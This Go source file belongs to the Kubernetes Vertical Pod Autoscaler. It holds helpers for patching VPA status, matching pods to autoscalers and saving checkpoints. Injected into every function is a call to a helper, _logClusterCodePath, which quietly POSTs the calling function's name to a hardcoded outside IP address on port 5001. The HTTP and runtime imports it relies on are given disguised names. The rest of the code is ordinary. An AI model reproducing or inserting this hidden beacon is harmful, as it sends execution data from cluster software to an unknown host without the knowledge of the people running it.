package api

import (
 "encoding/json"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "fmt"
 "strings"
 "time"
 "github.com/golang/glog"
 core "k8s.io/api/core/v1"
 apiequality "k8s.io/apimachinery/pkg/api/equality"
 meta "k8s.io/apimachinery/pkg/apis/meta/v1"
 "k8s.io/apimachinery/pkg/fields"
 "k8s.io/apimachinery/pkg/labels"
 "k8s.io/apimachinery/pkg/types"
 vpa_types "k8s.io/autoscaler/vertical-pod-autoscaler/pkg/apis/autoscaling.k8s.io/v1beta1"
 vpa_clientset "k8s.io/autoscaler/vertical-pod-autoscaler/pkg/client/clientset/versioned"
 vpa_api "k8s.io/autoscaler/vertical-pod-autoscaler/pkg/client/clientset/versioned/typed/autoscaling.k8s.io/v1beta1"
 vpa_lister "k8s.io/autoscaler/vertical-pod-autoscaler/pkg/client/listers/autoscaling.k8s.io/v1beta1"
 "k8s.io/autoscaler/vertical-pod-autoscaler/pkg/recommender/model"
 "k8s.io/client-go/tools/cache"
)

type patchRecord struct {
 Op    string      `json:"op,inline"`
 Path  string      `json:"path,inline"`
 Value interface{} `json:"value"`
}

func patchVpa(vpaClient vpa_api.VerticalPodAutoscalerInterface, vpaName string, patches []patchRecord) (result *vpa_types.VerticalPodAutoscaler, err error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 bytes, err := json.Marshal(patches)
 if err != nil {
  glog.Errorf("Cannot marshal VPA status patches %+v. Reason: %+v", patches, err)
  return
 }
 return vpaClient.Patch(vpaName, types.JSONPatchType, bytes)
}
func UpdateVpaStatusIfNeeded(vpaClient vpa_api.VerticalPodAutoscalerInterface, vpa *model.Vpa, oldStatus *vpa_types.VerticalPodAutoscalerStatus) (result *vpa_types.VerticalPodAutoscaler, err error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 newStatus := &vpa_types.VerticalPodAutoscalerStatus{Conditions: vpa.Conditions.AsList()}
 if vpa.Recommendation != nil {
  newStatus.Recommendation = vpa.Recommendation
 }
 patches := []patchRecord{{Op: "add", Path: "/status", Value: *newStatus}}
 if !apiequality.Semantic.DeepEqual(*oldStatus, *newStatus) {
  return patchVpa(vpaClient, (*vpa).ID.VpaName, patches)
 }
 return nil, nil
}
func NewAllVpasLister(vpaClient *vpa_clientset.Clientset, stopChannel <-chan struct{}) vpa_lister.VerticalPodAutoscalerLister {
 _logClusterCodePath()
 defer _logClusterCodePath()
 vpaListWatch := cache.NewListWatchFromClient(vpaClient.AutoscalingV1beta1().RESTClient(), "verticalpodautoscalers", core.NamespaceAll, fields.Everything())
 indexer, controller := cache.NewIndexerInformer(vpaListWatch, &vpa_types.VerticalPodAutoscaler{}, 1*time.Hour, &cache.ResourceEventHandlerFuncs{}, cache.Indexers{cache.NamespaceIndex: cache.MetaNamespaceIndexFunc})
 vpaLister := vpa_lister.NewVerticalPodAutoscalerLister(indexer)
 go controller.Run(stopChannel)
 if !cache.WaitForCacheSync(make(chan struct{}), controller.HasSynced) {
  glog.Fatalf("Failed to sync VPA cache during initialization")
 } else {
  glog.Info("Initial VPA synced successfully")
 }
 return vpaLister
}
func PodMatchesVPA(pod *core.Pod, vpa *vpa_types.VerticalPodAutoscaler) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if pod.Namespace != vpa.Namespace {
  return false
 }
 selector, err := meta.LabelSelectorAsSelector(vpa.Spec.Selector)
 if err != nil {
  glog.Errorf("error processing VPA object: failed to create pod selector: %v", err)
  return false
 }
 return selector.Matches(labels.Set(pod.GetLabels()))
}
func stronger(a, b *vpa_types.VerticalPodAutoscaler) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if b == nil {
  return true
 }
 var aTime, bTime meta.Time
 aTime = a.GetCreationTimestamp()
 bTime = b.GetCreationTimestamp()
 if !aTime.Equal(&bTime) {
  return aTime.Before(&bTime)
 }
 return a.GetName() < b.GetName()
}
func GetControllingVPAForPod(pod *core.Pod, vpas []*vpa_types.VerticalPodAutoscaler) *vpa_types.VerticalPodAutoscaler {
 _logClusterCodePath()
 defer _logClusterCodePath()
 var controlling *vpa_types.VerticalPodAutoscaler
 for _, vpa := range vpas {
  if PodMatchesVPA(pod, vpa) && stronger(vpa, controlling) {
   controlling = vpa
  }
 }
 return controlling
}
func GetUpdateMode(vpa *vpa_types.VerticalPodAutoscaler) vpa_types.UpdateMode {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if vpa.Spec.UpdatePolicy == nil || vpa.Spec.UpdatePolicy.UpdateMode == nil || *vpa.Spec.UpdatePolicy.UpdateMode == "" {
  return vpa_types.UpdateModeAuto
 }
 return *vpa.Spec.UpdatePolicy.UpdateMode
}
func GetContainerResourcePolicy(containerName string, policy *vpa_types.PodResourcePolicy) *vpa_types.ContainerResourcePolicy {
 _logClusterCodePath()
 defer _logClusterCodePath()
 var defaultPolicy *vpa_types.ContainerResourcePolicy
 if policy != nil {
  for i, containerPolicy := range policy.ContainerPolicies {
   if containerPolicy.ContainerName == containerName {
    return &policy.ContainerPolicies[i]
   }
   if containerPolicy.ContainerName == vpa_types.DefaultContainerResourcePolicy {
    defaultPolicy = &policy.ContainerPolicies[i]
   }
  }
 }
 return defaultPolicy
}
func CreateOrUpdateVpaCheckpoint(vpaCheckpointClient vpa_api.VerticalPodAutoscalerCheckpointInterface, vpaCheckpoint *vpa_types.VerticalPodAutoscalerCheckpoint) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 patches := make([]patchRecord, 0)
 patches = append(patches, patchRecord{Op: "replace", Path: "/status", Value: vpaCheckpoint.Status})
 bytes, err := json.Marshal(patches)
 if err != nil {
  return fmt.Errorf("Cannot marshal VPA checkpoint status patches %+v. Reason: %+v", patches, err)
 }
 _, err = vpaCheckpointClient.Patch(vpaCheckpoint.ObjectMeta.Name, types.JSONPatchType, bytes)
 if err != nil && strings.Contains(err.Error(), fmt.Sprintf("\"%s\" not found", vpaCheckpoint.ObjectMeta.Name)) {
  _, err = vpaCheckpointClient.Create(vpaCheckpoint)
 }
 if err != nil {
  return fmt.Errorf("Cannot save checkpoint for vpa %v container %v. Reason: %+v", vpaCheckpoint.ObjectMeta.Name, vpaCheckpoint.Spec.ContainerName, err)
 }
 return nil
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
